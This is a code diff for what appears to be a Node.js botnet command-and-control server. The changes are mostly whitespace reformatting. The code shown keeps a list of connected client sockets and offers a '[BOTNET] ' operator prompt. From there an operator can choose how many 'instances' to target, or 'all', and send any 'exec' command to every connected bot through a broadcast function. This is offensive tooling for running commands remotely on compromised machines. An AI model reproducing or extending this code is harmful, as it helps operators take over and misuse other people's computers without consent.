@@ -33,7 +33,7 @@ net
     clients.push(socket);
 
     clientCount++;
-		clientInstances = [...clients];
+    clientInstances = [...clients];
     console.log(`Client ${socket.name} has connected.\n`);
 
     setTerminalTitle();
@@ -41,20 +41,20 @@ net
 
     function prompt() {
       readline.question("[BOTNET] ", (msg) => {
-				msg = msg.toLowerCase();
+        msg = msg.toLowerCase();
 
-				if (msg === "instances") {
-					console.log(`Instances: ${clientInstances.length}`);
-				}
-
-        if (msg.startsWith("instances")) {
-					if (msg.split(" ")[1] <= clients.length) {
-						clientInstances = [...clients];
-						clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
-					}
+        if (msg === "instances") {
+          console.log(`Instances: ${clientInstances.length}`);
         }
 
-				if (msg.split(" ")[1] === "all") clientInstances = [...clients];
+        if (msg.startsWith("instances")) {
+          if (msg.split(" ")[1] <= clients.length) {
+            clientInstances = [...clients];
+            clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
+          }
+        }
+
+        if (msg.split(" ")[1] === "all") clientInstances = [...clients];
 
         if (msg.startsWith("exec")) broadcast(msg);
         return prompt();
@@ -71,7 +71,7 @@ net
     function clientDisconnected() {
       clients.splice(clients.indexOf(socket), 1);
       clientCount--;
-			clientInstances = [...clients];
+      clientInstances = [...clients];
       console.log(`Client ${socket.name} has disconnected.\n`);
       if (clientCount < 1) console.log("Waiting for clients to connect.\n");
       setTerminalTitle();
